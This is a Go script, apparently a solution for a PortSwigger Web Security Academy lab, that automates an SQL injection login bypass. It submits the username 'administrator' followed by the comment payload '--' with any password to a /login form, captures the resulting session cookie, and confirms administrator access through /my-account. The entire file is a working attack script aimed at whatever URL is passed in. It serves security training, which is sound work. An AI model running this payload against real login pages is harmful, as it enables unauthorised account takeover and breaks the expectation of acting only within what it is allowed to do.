package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"flag"
)

const (
	uri = "/login"
	uriGetAccount = "/my-account?id="
	defaultUsername = "administrator"
	defaultPayload = "'--"
	defaultPassowrd = "anything"
	contentType = "application/x-www-form-urlencoded"
	sessionCookieName = "session"
)

func main() {
	labURL, csrfToken, username, password, proxyURL := parseArgs()

	targetURL := prepareURL(labURL)
	client := prepareClient(proxyURL)

	sessionCookie := exploitSQLi(*client, targetURL, csrfToken, username, password)

	if sessionCookie == nil {
		fmt.Println("[-] Falid to send the payload and retrieve cookie")
		os.Exit(4)
	}

	exploited := assertThatUserIsLogedIn(*client, targetURL, username, sessionCookie)

	if exploited {
		fmt.Println("[+] SQL injection successful!")
	} else {
		fmt.Println("[-] SQL injection unsuccessful!")
	}
}

func parseArgs() (string, string, string, string, string) {
	labURL := flag.String("u", "", "Root URL of the PortSwigger Lab")
	csrfToken := flag.String("csrf", "", "CSRF Token")
	username := flag.String("username", "", "Username (Optional)")
	password := flag.String("password", "", "Password (Optional)")
	proxyURL := flag.String("proxy", "", "Proxy URL if wanted (Optional)")

	flag.Parse()

	if *labURL == "" || *csrfToken == ""{
		fmt.Println("The lab URL and CSRF Token must be provided")
		fmt.Printf("[-] Usage: -u <uri> --username <username> --password <password> <payload> --proxy <porxyURL>\n")
		os.Exit(1)
	}

	return *labURL, *csrfToken, *username, *password, *proxyURL
}

func prepareURL(labURL string) string {
	// Ensure URL has proper protocol prefix
	if !strings.HasPrefix(labURL, "http://") && !strings.HasPrefix(labURL, "https://") {
		labURL = "http://" + labURL
	}

	if strings.HasSuffix(labURL, "/") {
		labURL = labURL[:len(labURL) - 1]
	}

	return labURL
}

func configureProxy(proxyURL string) *http.Transport{
	transport := &http.Transport{}
	if proxyURL != "" {
		urlWithProxy, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Println("[-] Error parsing proxy URL:", err)
			os.Exit(2)
		}

		transport.Proxy = http.ProxyURL(urlWithProxy)
	}

	return transport
}

func prepareClient(proxyURL string) *http.Client {
	return &http.Client{Transport: configureProxy(proxyURL)}
}

func exploitSQLi(client http.Client, targetURL, csrfToken, username, password string) *http.Cookie {
	fullURL := targetURL + uri
	if username == "" {
		username = defaultUsername + defaultPayload
	}
	if password == "" {
		password = defaultPassowrd
	}

	fmt.Printf("[+] Sendding request to URL \"%s\"\n", fullURL)
	fmt.Printf("[+] with Username: \"%s\" and Password: \"%s\"\n", username, password)

	requestBody := fmt.Sprintf("csrf=%s&username=%s&password=%s", csrfToken, username, password)

	// Create the POST request
	req, err := http.NewRequest("POST", fullURL, strings.NewReader(requestBody))
	if err != nil {
		fmt.Println("[-] Error creating request:", err)
		return nil
	}
	// Set Content-Type header (if needed, e.g., for form data)
	req.Header.Set("Content-Type", contentType)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error during HTTP request:", err)
		return nil
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			fmt.Println("[-] Error while closing response body")
		}
	}(resp.Body)

	// Get all cookies form the response
	cookies := resp.Cookies()

	var sessionCookie *http.Cookie
	for _, cookie := range cookies {
		if cookie.Name == sessionCookieName {
			sessionCookie = cookie
			break
		}
	}

	return sessionCookie
}

func assertThatUserIsLogedIn(client http.Client, targetURL, username string, cookie *http.Cookie) bool {
	fullURL := targetURL + uriGetAccount + username

	// Create a new HTTP GET request
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	// Add the cookie to the request
	req.AddCookie(cookie)

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			fmt.Println("[-] Error while closing response body")
		}
	}(resp.Body)

	// Assert on the status code
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("[+] Status code is as expected: %d\n", resp.StatusCode)
		return true
	} else {
		fmt.Printf("[-] Unexpected status code: got %d, expected %d\n", resp.StatusCode, http.StatusOK)
		return false
	}
}